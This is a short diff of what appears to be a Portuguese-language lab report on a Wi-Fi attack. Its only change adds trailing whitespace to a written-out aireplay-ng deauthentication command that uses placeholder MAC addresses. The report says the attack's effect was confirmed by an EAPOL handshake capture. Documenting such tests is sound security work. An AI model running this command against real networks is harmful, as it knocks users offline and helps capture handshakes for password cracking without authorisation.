@@ -3,7 +3,7 @@
 O log de saída deste comando não foi salvo no momento da execução.
 
 Comando utilizado:
-sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlo1mon
+sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlo1mon 
 
 A efetividade do ataque foi confirmada indiretamente pela marcação
 "EAPOL" associada ao dispositivo-alvo na captura registrada em
